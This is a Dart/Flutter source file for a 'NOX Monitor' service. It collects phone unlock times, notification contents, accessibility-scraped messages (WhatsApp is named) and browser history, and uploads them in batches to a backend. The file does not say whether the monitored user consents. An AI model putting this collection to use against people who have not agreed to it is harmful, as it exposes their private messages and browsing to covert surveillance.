import 'dart:async';
import 'package:flutter/foundation.dart';
import 'api_service.dart';
import 'native_bridge.dart';

/// Drains native-side buffers (unlocks, notifications, accessibility scrapes,
/// browser URLs) and posts them to the backend. Runs on a fixed timer plus
/// an event stream so pushes happen within a few seconds of the user
/// unlocking the phone or getting a notification.
class MonitorService {
  final ApiService _api;
  Timer? _timer;
  StreamSubscription? _nudgeSub;
  bool _draining = false;

  MonitorService(this._api);

  Future<void> start() async {
    stop();

    // Periodic drain every 30s as a safety net.
    _timer = Timer.periodic(const Duration(seconds: 30), (_) => _drainAll());

    // React to native nudges almost immediately. We debounce to batch bursty
    // events (e.g. a wave of WhatsApp notifications arriving together).
    Timer? debounce;
    _nudgeSub = NativeBridge.nudges.listen((_) {
      debounce?.cancel();
      debounce = Timer(const Duration(seconds: 2), () => _drainAll());
    });

    // Kick off an initial drain in case there's a leftover buffer from a
    // previous session.
    unawaited(_drainAll());
  }

  void stop() {
    _timer?.cancel();
    _timer = null;
    _nudgeSub?.cancel();
    _nudgeSub = null;
  }

  Future<void> _drainAll() async {
    if (_draining) return;
    _draining = true;
    try {
      await Future.wait([
        _drainUnlocks(),
        _drainSocial(),
        _drainBrowser(),
      ]);
    } finally {
      _draining = false;
    }
  }

  Future<void> _drainUnlocks() async {
    try {
      final timestamps = await NativeBridge.drainUnlocks();
      if (timestamps.isEmpty) return;
      await _api.submitUnlockEventsBatch(timestamps);
      debugPrint('[NOX Monitor] Pushed ${timestamps.length} unlock events');
    } catch (e) {
      debugPrint('[NOX Monitor] unlock drain error: $e');
    }
  }

  Future<void> _drainSocial() async {
    try {
      // Notifications first (fast path for WhatsApp messages).
      final notifications = await NativeBridge.drainNotifications();
      final a11y = await NativeBridge.drainAccessibility();

      final merged = <Map<String, dynamic>>[
        ...notifications,
        ...a11y,
      ];
      if (merged.isEmpty) return;

      // The DTO expects: appPackage, eventType, content?, metadata?, occurredAt.
      final sanitized = merged
          .map((e) => {
                'appPackage': (e['appPackage'] ?? '').toString(),
                'eventType': (e['eventType'] ?? 'MESSAGE_INCOMING').toString(),
                if (e['content'] != null) 'content': e['content'].toString(),
                if (e['metadata'] != null) 'metadata': e['metadata'],
                'occurredAt':
                    (e['occurredAt'] ?? DateTime.now().toUtc().toIso8601String())
                        .toString(),
              })
          .where((e) => (e['appPackage'] as String).isNotEmpty)
          .toList();

      // Chunk to avoid 10MB request bodies on huge backlogs.
      for (var i = 0; i < sanitized.length; i += 100) {
        final slice = sanitized.sublist(
          i,
          i + 100 > sanitized.length ? sanitized.length : i + 100,
        );
        await _api.submitSocialEventsBatch(slice);
      }
      debugPrint('[NOX Monitor] Pushed ${sanitized.length} social events');
    } catch (e) {
      debugPrint('[NOX Monitor] social drain error: $e');
    }
  }

  Future<void> _drainBrowser() async {
    try {
      final raw = await NativeBridge.drainBrowserHistory();
      if (raw.isEmpty) return;

      final items = raw
          .map((e) => {
                'url': (e['url'] ?? '').toString(),
                'browser': (e['appPackage'] ?? '').toString(),
                'visitedAt': (e['occurredAt'] ??
                        DateTime.now().toUtc().toIso8601String())
                    .toString(),
              })
          .where((e) => (e['url'] as String).isNotEmpty)
          .toList();

      if (items.isEmpty) return;

      for (var i = 0; i < items.length; i += 100) {
        final slice = items.sublist(
          i,
          i + 100 > items.length ? items.length : i + 100,
        );
        await _api.submitBrowserVisitsBatch(slice);
      }
      debugPrint('[NOX Monitor] Pushed ${items.length} browser visits');
    } catch (e) {
      debugPrint('[NOX Monitor] browser drain error: $e');
    }
  }
}
